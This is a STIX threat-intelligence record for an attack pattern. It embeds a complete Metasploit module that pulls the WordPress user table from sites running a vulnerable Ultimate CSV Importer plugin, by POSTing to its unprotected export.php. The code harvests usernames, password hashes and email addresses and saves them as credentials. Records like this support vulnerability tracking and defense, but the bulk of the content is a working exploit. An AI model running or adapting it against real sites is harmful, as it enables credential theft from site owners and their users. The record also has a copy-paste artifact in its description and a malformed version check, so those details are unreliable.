{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--150a2d99-82ba-4bcd-9398-e3a1cfdb4368",
    "created": "2024-08-14T16:32:49.247648Z",
    "modified": "2024-08-14T16:32:49.247652Z",
    "name": "WordPress Ultimate CSV Importer User Table Extract",
    "description": " Due to lack of verification of a visitor's permissions, it is possible to execute the 'export.php' script included in the default installation of the Ultimate CSV Importer plugin and retrieve the full contents of the user table in the WordPress installation. This results in full disclosure of usernames hashed passwords and email addresses for all users.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/wp_ultimate_csv_importer_user_extract.rb",
            "external_id": "wp_ultimate_csv_importer_user_extract.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7778"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'csv'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Ultimate CSV Importer User Table Extract',\n      'Description'     => %q{\n        Due to lack of verification of a visitor's permissions, it is possible\n        to execute the 'export.php' script included in the default installation of the\n        Ultimate CSV Importer plugin and retrieve the full contents of the user table\n        in the WordPress installation. This results in full disclosure of usernames,\n        hashed passwords and email addresses for all users.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'James Hooker', # Disclosure\n          'rastating'     # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['WPVDB', '7778']\n        ],\n      'DisclosureDate'  => '2015-02-02'\n    ))\n  end\n\n  def plugin_url\n    normalize_uri(wordpress_url_plugins, 'wp-ultimate-csv-importer')\n  end\n\n  def exporter_url\n    normalize_uri(plugin_url, 'modules', 'export', 'templates', 'export.php')\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-ultimate-csv-importer', '3.6.7' '3.6.0')\n  end\n\n  def process_row(row)\n    if row[:user_login] && row[:user_pass]\n      print_good(\"Found credential: #{row[:user_login]}:#{row[:user_pass]}\")\n\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        private_type: :nonreplayable_hash,\n        address: ::Rex::Socket.getaddress(rhost, true),\n        port: rport,\n        protocol: 'tcp',\n        service_name: ssl ? 'https' : 'http',\n        username: row[:user_login],\n        private_data: row[:user_pass],\n        workspace_id: myworkspace_id\n      }\n\n      credential_core = create_credential(credential_data)\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n      login_data.merge!(credential_data)\n      create_credential_login(login_data)\n    end\n  end\n\n  def parse_csv(body, delimiter)\n    begin\n      CSV::Converters[:blank_to_nil] = lambda do |field|\n        field && field.empty? ? nil : field\n      end\n      csv = CSV.new(body, :col_sep => delimiter, :headers => true, :header_converters => :symbol, :converters => [:all, :blank_to_nil])\n      csv.to_a.map { |row| process_row(row) }\n      return true\n    rescue\n      return false\n    end\n  end\n\n  def run\n    print_status(\"Requesting CSV extract...\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => exporter_url,\n      'vars_post' => { 'export' => 'users' }\n    )\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    fail_with(Failure::UnexpectedReply, \"Server responded with status code #{res.code}\") if res.code != 200\n\n    print_status(\"Parsing response...\")\n    unless parse_csv(res.body, ',')\n      unless parse_csv(res.body, ';')\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to parse response, the CSV was invalid\")\n      end\n    end\n\n    store_path = store_loot('wordpress.users.export', 'csv', datastore['RHOST'], res.body, 'users_export.csv', 'WordPress User Table Extract')\n    print_good(\"CSV saved to #{store_path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-02"
}